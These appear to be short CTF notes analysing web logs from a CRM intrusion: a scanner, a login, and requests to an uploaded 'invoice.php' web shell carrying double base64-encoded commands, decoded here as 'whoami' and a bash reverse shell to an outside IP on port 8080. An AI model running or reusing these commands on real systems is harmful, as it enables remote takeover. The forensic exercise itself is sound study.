# Firstshift CTF - Portal Drop

**Date:** 06-Nov-2025

34.67.91.83 - - [06/Nov/2025:14:16:14 +0000] "POST /CRM/login.php HTTP/1.1" 401 2018 "https://crm.trypatchme.thm" "PF-Scanner/1.0"

	PF-Scanner/1.0 - user agent
	POST /CRM/login.php HTTP/1.1 - login


logins at - 06/Nov/2025:14:20:54

access upload at - 06/Nov/2025:14:27:32

[06/Nov/2025:14:27:34 +0000] "POST /CRM/portal/uploads/invoice.php?q=ZDJodllXMXA&auth=31337

	encoded - ZDJodllXMXA
	double encoded - whoami


[06/Nov/2025:14:28:34 +0000] "POST /CRM/portal/uploads/invoice.php?q=WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1UVXVOVGd1TVRRNExqZzJMemd3T0RBZ01ENG1NUT09&auth=31337


	encoded -WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1UVXVOVGd1TVRRNExqZzJMemd3T0RBZ01ENG1NUT09
	 double encoded - bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
